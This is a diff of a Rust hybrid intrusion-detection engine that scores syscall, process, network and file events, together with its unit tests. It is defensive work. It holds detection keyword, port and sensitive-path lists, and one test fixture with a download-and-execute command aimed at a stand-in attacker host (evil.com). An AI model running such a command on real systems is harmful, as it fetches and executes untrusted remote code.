@@ -1,90 +1,98 @@
-//! Hybrid Detection Engine
+//! Hybrid detection engine.
 //!
-//! Combines STIDE (fast path) and MLP (deep path) for optimal detection.
-//! Implements adaptive switching based on event characteristics and system load.
+//! Syscall events go through STIDE (fast path, n-gram membership) and, when
+//! STIDE flags the n-gram, through the embedded MLP (deep path, feature set v1
+//! over the process's recent syscall numbers). Process, network and file events
+//! are scored by small keyword / port / path rules only: the MLP was trained on
+//! syscall traces and has nothing to say about them.
+//!
+//! All event access goes through `sentinel_abi::EventFields`, so the JSON path
+//! and the binary path run exactly the same code.
 
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
-use std::collections::HashMap;
+use std::collections::{HashMap, VecDeque};
 
-use crate::mlp::{features, MlpConfig, MlpDetector};
+use sentinel_abi::{EventFields, JsonEvent};
+
+use crate::features::adfa_features;
+use crate::mlp::MlpDetector;
 use crate::stide::{StideConfig, StideDetector};
 use crate::DetectionResult;
 
-/// Hybrid detector configuration
+/// Hybrid detector configuration. Every field has a default so a partial
+/// JSON config (passed to `init`) only overrides what it names.
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(default)]
 pub struct HybridConfig {
     /// STIDE configuration
     pub stide: StideConfig,
-    /// MLP configuration
-    pub mlp: MlpConfig,
-    /// Use STIDE for fast path
+    /// Override of the embedded model's decision threshold
+    pub mlp_threshold: Option<f32>,
+    /// Use STIDE for the fast path
     pub use_stide: bool,
-    /// Use MLP for deep analysis
+    /// Use the MLP for the deep path
     pub use_mlp: bool,
-    /// STIDE threshold to trigger MLP
+    /// STIDE score at or above which the MLP runs
     pub stide_mlp_threshold: f32,
-    /// Weight for combining scores
+    /// Weights for combining the two scores
     pub stide_weight: f32,
     pub mlp_weight: f32,
+    /// Syscall numbers kept per process for MLP features
+    pub syscall_window: usize,
+    /// Upper bound on tracked processes; the least recently seen is evicted
+    pub max_processes: usize,
 }
 
 impl Default for HybridConfig {
     fn default() -> Self {
         Self {
             stide: StideConfig::default(),
-            mlp: MlpConfig::default(),
+            mlp_threshold: None,
             use_stide: true,
             use_mlp: true,
             stide_mlp_threshold: 0.5,
             stide_weight: 0.4,
             mlp_weight: 0.6,
+            syscall_window: 100,
+            max_processes: 4096,
         }
     }
 }
 
-/// Per-process state for syscall sequence tracking
+/// Per-process syscall history.
 struct ProcessState {
-    syscall_history: Vec<String>,
-    max_history: usize,
+    numbers: VecDeque<u32>,
+    last_seen: u64,
 }
 
 impl ProcessState {
-    fn new() -> Self {
+    fn new(seen: u64) -> Self {
         Self {
-            syscall_history: Vec::new(),
-            max_history: 100,
+            numbers: VecDeque::new(),
+            last_seen: seen,
         }
     }
 
-    fn add_syscall(&mut self, syscall: &str) {
-        if self.syscall_history.len() >= self.max_history {
-            self.syscall_history.remove(0);
+    fn push(&mut self, nr: u32, window: usize) {
+        if self.numbers.len() >= window {
+            self.numbers.pop_front();
         }
-        self.syscall_history.push(syscall.to_string());
+        self.numbers.push_back(nr);
     }
 
-    fn get_recent(&self, n: usize) -> Vec<&str> {
-        self.syscall_history
-            .iter()
-            .rev()
-            .take(n)
-            .map(|s| s.as_str())
-            .collect::<Vec<_>>()
-            .into_iter()
-            .rev()
-            .collect()
+    fn window(&self) -> Vec<u32> {
+        self.numbers.iter().copied().collect()
     }
 }
 
-/// Hybrid detector combining STIDE and MLP
+/// Hybrid detector combining STIDE and the embedded MLP.
 pub struct HybridDetector {
     config: HybridConfig,
     stide: StideDetector,
     mlp: MlpDetector,
-    /// Per-process syscall history
     process_states: HashMap<u32, ProcessState>,
-    /// Detection statistics
+    clock: u64,
     stats: HybridStats,
 }
 
@@ -95,6 +103,8 @@ pub struct HybridStats {
     pub mlp_only_detections: u64,
     pub hybrid_detections: u64,
     pub avg_threat_level: f32,
+    pub tracked_processes: usize,
+    pub evicted_processes: u64,
     pub stide_stats: crate::stide::StideStats,
     pub mlp_stats: crate::mlp::MlpStats,
 }
@@ -104,12 +114,19 @@ impl HybridDetector {
         Self::with_config(HybridConfig::default())
     }
 
+    /// Build a detector. The MLP always carries the embedded, trained weights;
+    /// the config can only move its threshold.
     pub fn with_config(config: HybridConfig) -> Self {
+        let mut mlp = MlpDetector::with_embedded_weights();
+        if let Some(t) = config.mlp_threshold {
+            mlp.set_threshold(t);
+        }
         Self {
             stide: StideDetector::with_config(config.stide.clone()),
-            mlp: MlpDetector::with_config(config.mlp.clone()),
+            mlp,
             config,
             process_states: HashMap::new(),
+            clock: 0,
             stats: HybridStats::default(),
         }
     }
@@ -119,15 +136,32 @@ impl HybridDetector {
         Self::with_config(config)
     }
 
-    /// Main detection entry point
+    /// Detect on a JSON event (host shape or flat record).
     pub fn detect(&mut self, event: &Value) -> DetectionResult {
+        self.detect_fields(&JsonEvent(event))
+    }
+
+    /// Detect on any event view; this is the single entry point for both the
+    /// JSON and the binary path.
+    pub fn detect_fields<E: EventFields>(&mut self, event: &E) -> DetectionResult {
         self.stats.total_events += 1;
+        self.clock += 1;
 
-        let event_type = event["type"].as_str().unwrap_or("");
-
-        match event_type {
+        match event.event_type() {
             "syscall" => self.detect_syscall(event),
             "process" => self.detect_process(event),
+            "process_exit" => {
+                if let Some(pid) = event.pid() {
+                    self.clear_process_state(pid as u32);
+                }
+                DetectionResult {
+                    threat_level: 0,
+                    confidence: 1.0,
+                    detection_method: "process_exit".to_string(),
+                    anomaly_score: 0.0,
+                    details: "Process state released".to_string(),
+                }
+            }
             "network" => self.detect_network(event),
             "file" => self.detect_file(event),
             _ => DetectionResult {
@@ -140,34 +174,55 @@ impl HybridDetector {
         }
     }
 
-    /// Detect threats in syscall events using hybrid approach
-    fn detect_syscall(&mut self, event: &Value) -> DetectionResult {
-        // Host events carry their payload under "data" (events.Event); flat
-        // ADFA-style records keep the fields at the top level.
-        let fields = if event["data"].is_object() {
-            &event["data"]
-        } else {
-            event
-        };
-        let pid = fields["pid"].as_u64().unwrap_or(0) as u32;
-        let syscall_name = fields["syscall_name"].as_str().unwrap_or("");
-
-        // Update process state
+    fn state_for(&mut self, pid: u32) -> &mut ProcessState {
+        if !self.process_states.contains_key(&pid)
+            && self.process_states.len() >= self.config.max_processes
+        {
+            if let Some(&victim) = self
+                .process_states
+                .iter()
+                .min_by_key(|(_, s)| s.last_seen)
+                .map(|(p, _)| p)
+            {
+                self.process_states.remove(&victim);
+                self.stats.evicted_processes += 1;
+            }
+        }
+        let clock = self.clock;
         let state = self
             .process_states
             .entry(pid)
-            .or_insert_with(ProcessState::new);
-        state.add_syscall(syscall_name);
+            .or_insert_with(|| ProcessState::new(clock));
+        state.last_seen = clock;
+        state
+    }
 
-        // Fast path: STIDE detection
+    /// Syscall events: STIDE on the syscall name (or number when no name is
+    /// known), MLP on the process's recent syscall numbers.
+    fn detect_syscall<E: EventFields>(&mut self, event: &E) -> DetectionResult {
+        let pid = event.pid().unwrap_or(0) as u32;
+        let nr = event.syscall_nr();
+        let name = event.syscall_name().unwrap_or("");
+        let key = if name.is_empty() {
+            nr.map(|n| n.to_string()).unwrap_or_default()
+        } else {
+            name.to_string()
+        };
+
+        let window = self.config.syscall_window;
+        let state = self.state_for(pid);
+        if let Some(n) = nr {
+            state.push(n as u32, window);
+        }
+        let numbers = state.window();
+
+        // Fast path: STIDE
         let stide_score = if self.config.use_stide {
-            self.stide.detect(syscall_name)
+            self.stide.detect(&key)
         } else {
             0.0
         };
-
-        // If STIDE score is low, skip MLP (fast path)
-        if stide_score < self.config.stide_mlp_threshold && self.config.use_stide {
+        if self.config.use_stide && stide_score < self.config.stide_mlp_threshold {
             return DetectionResult {
                 threat_level: 0,
                 confidence: 1.0 - stide_score,
@@ -177,20 +232,15 @@ impl HybridDetector {
             };
         }
 
-        // Deep path: MLP detection
-        let mlp_score = if self.config.use_mlp {
-            let recent_syscalls = state.get_recent(50);
-            let syscalls_refs: Vec<&str> = recent_syscalls.iter().map(|s| *s).collect();
-            let features = features::extract_syscall_features(&syscalls_refs, 64);
-            self.mlp.detect(&features)
+        // Deep path: MLP on feature set v1 over the process window
+        let mlp_score = if self.config.use_mlp && !numbers.is_empty() {
+            self.mlp.detect(&adfa_features(&numbers))
         } else {
             0.0
         };
 
-        // Combine scores
         let combined_score =
             stide_score * self.config.stide_weight + mlp_score * self.config.mlp_weight;
-
         let threat_level = self.score_to_threat_level(combined_score);
         let detection_method = if stide_score > 0.0 && mlp_score > 0.0 {
             self.stats.hybrid_detections += 1;
@@ -202,7 +252,6 @@ impl HybridDetector {
             self.stats.mlp_only_detections += 1;
             "mlp"
         };
-
         let confidence = self.calculate_confidence(stide_score, mlp_score);
 
         DetectionResult {
@@ -211,37 +260,32 @@ impl HybridDetector {
             detection_method: detection_method.to_string(),
             anomaly_score: combined_score,
             details: format!(
-                "Hybrid detection: STIDE={:.3}, MLP={:.3}, combined={:.3}",
-                stide_score, mlp_score, combined_score
+                "Hybrid detection: STIDE={:.3}, MLP={:.3}, combined={:.3}, window={}",
+                stide_score,
+                mlp_score,
+                combined_score,
+                numbers.len()
             ),
         }
     }
 
-    /// Detect threats in process events
-    fn detect_process(&mut self, event: &Value) -> DetectionResult {
-        let data = &event["data"];
-        let process = &data["process"];
+    /// Process events: keyword rules only.
+    fn detect_process<E: EventFields>(&mut self, event: &E) -> DetectionResult {
+        let executable = event.executable().unwrap_or("");
+        let command_line = event.command_line().unwrap_or_default();
+        let name = event.process_name().unwrap_or("");
 
-        let executable = process["executable"].as_str().unwrap_or("");
-        let command_line = process["command_line"].as_str().unwrap_or("");
-        let uid = process["uid"].as_u64().unwrap_or(1000) as u32;
-        let name = process["name"].as_str().unwrap_or("");
-
-        // Rule-based quick checks
         let mut rule_score: f32 = 0.0;
 
-        // Check for suspicious executables
         let suspicious_paths = ["/tmp/", "/var/tmp/", "/dev/shm/"];
         if suspicious_paths.iter().any(|p| executable.contains(p)) {
             rule_score += 0.4;
         }
 
-        // Check for shell with -c flag (common in attacks)
         if (name == "sh" || name == "bash" || name == "dash") && command_line.contains("-c") {
             rule_score += 0.3;
         }
 
-        // Check for common attack patterns in command line
         let attack_patterns = [
             ("wget", 0.2),
             ("curl", 0.2),
@@ -255,59 +299,45 @@ impl HybridDetector {
             ("python -c", 0.3),
             ("perl -e", 0.3),
         ];
-
+        let lowered = command_line.to_lowercase();
         for (pattern, score) in attack_patterns {
-            if command_line.to_lowercase().contains(pattern) {
+            if lowered.contains(pattern) {
                 rule_score += score;
             }
         }
 
-        // MLP features for process
-        let mlp_score = if self.config.use_mlp {
-            let features = features::extract_process_features(executable, command_line, uid, 64);
-            self.mlp.detect(&features)
-        } else {
-            0.0
-        };
-
-        let combined_score = (rule_score.min(1.0) + mlp_score) / 2.0;
-        let threat_level = self.score_to_threat_level(combined_score);
+        let score = rule_score.min(1.0);
+        let threat_level = self.score_to_threat_level(score);
 
         DetectionResult {
             threat_level,
             confidence: 0.8,
-            detection_method: "process_hybrid".to_string(),
-            anomaly_score: combined_score,
+            detection_method: "process_rule".to_string(),
+            anomaly_score: score,
             details: format!(
-                "Process analysis: rule={:.3}, mlp={:.3}, exec={}",
-                rule_score, mlp_score, executable
+                "Process analysis: rule={:.3}, exec={}",
+                rule_score, executable
             ),
         }
     }
 
-    /// Detect threats in network events
-    fn detect_network(&mut self, event: &Value) -> DetectionResult {
-        let data = &event["data"];
-        let network = &data["network"];
-
-        let dest_port = network["dest_port"].as_u64().unwrap_or(0) as u16;
-        let dest_ip = network["dest_ip"].as_str().unwrap_or("");
-        let direction = network["direction"].as_str().unwrap_or("");
+    /// Network events: port list and destination class.
+    fn detect_network<E: EventFields>(&mut self, event: &E) -> DetectionResult {
+        let dest_port = event.dest_port().unwrap_or(0) as u16;
+        let dest_ip = event.dest_ip().unwrap_or_default();
+        let direction = event.direction().unwrap_or("");
 
         let mut score = 0.0;
 
-        // Check suspicious ports
         let high_risk_ports = [4444, 5555, 6666, 7777, 8888, 9999, 1337, 31337];
         let medium_risk_ports = [22, 23, 3389, 5900];
-
         if high_risk_ports.contains(&dest_port) {
             score += 0.5;
         } else if medium_risk_ports.contains(&dest_port) {
             score += 0.2;
         }
 
-        // Check for external connections
-        if direction == "outbound" && !Self::is_private_ip(dest_ip) {
+        if direction == "outbound" && !Self::is_private_ip(&dest_ip) {
             score += 0.2;
         }
 
@@ -322,17 +352,13 @@ impl HybridDetector {
         }
     }
 
-    /// Detect threats in file events
-    fn detect_file(&mut self, event: &Value) -> DetectionResult {
-        let data = &event["data"];
-        let file = &data["file"];
-
-        let path = file["path"].as_str().unwrap_or("");
-        let operation = file["operation"].as_str().unwrap_or("");
+    /// File events: sensitive paths.
+    fn detect_file<E: EventFields>(&mut self, event: &E) -> DetectionResult {
+        let path = event.file_path().unwrap_or("");
+        let operation = event.file_operation().unwrap_or("");
 
         let mut score = 0.0;
 
-        // Sensitive file access
         let sensitive_paths = [
             ("/etc/passwd", 0.3),
             ("/etc/shadow", 0.5),
@@ -340,11 +366,10 @@ impl HybridDetector {
             ("/.ssh/", 0.4),
             ("/root/", 0.3),
         ];
-
         for (sensitive_path, path_score) in sensitive_paths {
             if path.contains(sensitive_path) {
                 score += path_score;
-                if operation == "write" || operation == "delete" {
+                if operation == "write" || operation == "create" || operation == "delete" {
                     score += 0.2;
                 }
             }
@@ -378,15 +403,12 @@ impl HybridDetector {
         }
     }
 
-    /// Calculate confidence based on agreement between detectors
+    /// Confidence from the agreement between the two detectors
     fn calculate_confidence(&self, stide_score: f32, mlp_score: f32) -> f32 {
-        // If both detectors agree, confidence is high
         let agreement = 1.0 - (stide_score - mlp_score).abs();
-        // Base confidence + agreement bonus
         0.5 + agreement * 0.5
     }
 
-    /// Check if IP is private
     fn is_private_ip(ip: &str) -> bool {
         ip.starts_with("10.")
             || ip.starts_with("192.168.")
@@ -401,29 +423,28 @@ impl HybridDetector {
             || ip == "localhost"
     }
 
-    /// Train the detector with normal behavior data
+    /// Train STIDE on normal syscall events (host shape or flat records).
     pub fn train(&mut self, events: &[Value]) {
         for event in events {
-            let event_type = event["type"].as_str().unwrap_or("");
-
-            if event_type == "syscall" {
-                let syscall_name = event["syscall_name"].as_str().unwrap_or("");
-                if !syscall_name.is_empty() {
-                    self.stide.train_on(syscall_name);
+            let view = JsonEvent(event);
+            if view.event_type() == "syscall" {
+                let name = view.syscall_name().unwrap_or("");
+                if !name.is_empty() {
+                    self.stide.train_on(name);
+                } else if let Some(nr) = view.syscall_nr() {
+                    self.stide.train_on(&nr.to_string());
                 }
             }
         }
-
-        // Finalize training
         self.stide.fit();
     }
 
-    /// Load pre-trained MLP weights
+    /// Load MLP weights at run time (tests, experiments); deployments use the
+    /// embedded weights.
     pub fn load_mlp_weights(&mut self, weights_json: &str) -> Result<(), String> {
         self.mlp.load_weights(weights_json)
     }
 
-    /// Get statistics
     pub fn get_stats(&self) -> HybridStats {
         HybridStats {
             total_events: self.stats.total_events,
@@ -431,14 +452,21 @@ impl HybridDetector {
             mlp_only_detections: self.stats.mlp_only_detections,
             hybrid_detections: self.stats.hybrid_detections,
             avg_threat_level: self.stats.avg_threat_level,
+            tracked_processes: self.process_states.len(),
+            evicted_processes: self.stats.evicted_processes,
             stide_stats: self.stide.get_stats().clone(),
             mlp_stats: self.mlp.get_stats().clone(),
         }
     }
 
-    /// Clear process state for a given PID
+    /// Drop the syscall history of a process.
     pub fn clear_process_state(&mut self, pid: u32) {
         self.process_states.remove(&pid);
+    }
+
+    /// Number of processes currently tracked.
+    pub fn tracked_processes(&self) -> usize {
+        self.process_states.len()
     }
 }
 
@@ -452,48 +480,31 @@ impl Default for HybridDetector {
 mod tests {
     use super::*;
 
-    #[test]
-    fn test_hybrid_syscall_detection() {
-        let mut detector = HybridDetector::new();
-
-        // Train on normal syscalls
-        let training_data: Vec<Value> = (0..100)
-            .flat_map(|_| {
-                ["read", "write", "close", "open"].iter().map(|s| {
-                    serde_json::json!({
-                        "type": "syscall",
-                        "syscall_name": s
-                    })
-                })
-            })
-            .collect();
-
-        detector.train(&training_data);
-
-        // Test normal syscall
-        let normal_event = serde_json::json!({
-            "type": "syscall",
-            "pid": 1234,
-            "syscall_name": "read"
-        });
-        let result = detector.detect(&normal_event);
-        assert!(result.threat_level <= 2);
-
-        // Test anomalous syscall sequence
-        for syscall in ["execve", "mprotect", "ptrace"] {
-            let _ = detector.detect(&serde_json::json!({
-                "type": "syscall",
-                "pid": 1234,
-                "syscall_name": syscall
-            }));
-        }
+    fn syscall(pid: u32, name: &str, nr: u32) -> Value {
+        serde_json::json!({"type": "syscall", "pid": pid, "syscall_name": name, "syscall_nr": nr})
     }
 
     #[test]
-    fn test_hybrid_process_detection() {
+    fn test_hybrid_syscall_detection() {
         let mut detector = HybridDetector::new();
+        let training: Vec<Value> = (0..100)
+            .flat_map(|_| [("read", 0), ("write", 1), ("close", 57), ("openat", 56)])
+            .map(|(n, nr)| syscall(1, n, nr))
+            .collect();
+        detector.train(&training);
 
-        // Suspicious process
+        let result = detector.detect(&syscall(1234, "read", 0));
+        assert!(result.threat_level <= 2);
+
+        for (name, nr) in [("execve", 59), ("mprotect", 10), ("ptrace", 101)] {
+            let _ = detector.detect(&syscall(1234, name, nr));
+        }
+        assert_eq!(detector.tracked_processes(), 1);
+    }
+
+    #[test]
+    fn test_hybrid_process_detection_is_rule_based() {
+        let mut detector = HybridDetector::new();
         let event = serde_json::json!({
             "type": "process",
             "data": {
@@ -501,32 +512,52 @@ mod tests {
                     "executable": "/tmp/malware",
                     "name": "bash",
                     "command_line": "bash -c 'wget http://evil.com/shell.sh | bash'",
-                    "uid": 0
-                }
+                },
+                "uid": 0
             }
         });
-
         let result = detector.detect(&event);
         assert!(result.threat_level >= 5, "Should detect suspicious process");
+        assert_eq!(result.detection_method, "process_rule");
+
+        let benign = serde_json::json!({"type": "process", "data": {"process": {"executable": "/usr/bin/ls", "name": "ls", "command_line": "ls -l"}}});
+        assert_eq!(detector.detect(&benign).threat_level, 0);
     }
 
     #[test]
     fn test_hybrid_network_detection() {
         let mut detector = HybridDetector::new();
-
-        // Suspicious network connection
         let event = serde_json::json!({
             "type": "network",
-            "data": {
-                "network": {
-                    "dest_ip": "123.45.67.89",
-                    "dest_port": 4444,
-                    "direction": "outbound"
-                }
-            }
+            "data": {"network": {"dest_ip": "123.45.67.89", "dest_port": 4444, "direction": "outbound"}}
         });
-
         let result = detector.detect(&event);
         assert!(result.threat_level >= 4, "Should detect suspicious port");
+    }
+
+    #[test]
+    fn test_process_exit_releases_state_and_eviction_bounds_memory() {
+        let config = HybridConfig {
+            max_processes: 8,
+            ..HybridConfig::default()
+        };
+        let mut detector = HybridDetector::with_config(config);
+        for pid in 1..=20 {
+            let _ = detector.detect(&syscall(pid, "read", 0));
+        }
+        assert_eq!(detector.tracked_processes(), 8);
+        assert_eq!(detector.get_stats().evicted_processes, 12);
+        // The oldest pids were evicted, the newest survive.
+        let _ = detector
+            .detect(&serde_json::json!({"type": "process_exit", "pid": 20, "data": {"pid": 20}}));
+        assert_eq!(detector.tracked_processes(), 7);
+    }
+
+    #[test]
+    fn test_embedded_model_is_the_trained_one() {
+        let detector = HybridDetector::new();
+        let cfg = detector.mlp.get_config();
+        assert_eq!(cfg.hidden_sizes, crate::weights::HIDDEN_SIZES.to_vec());
+        assert_eq!(cfg.input_size, crate::weights::INPUT_SIZE);
     }
 }
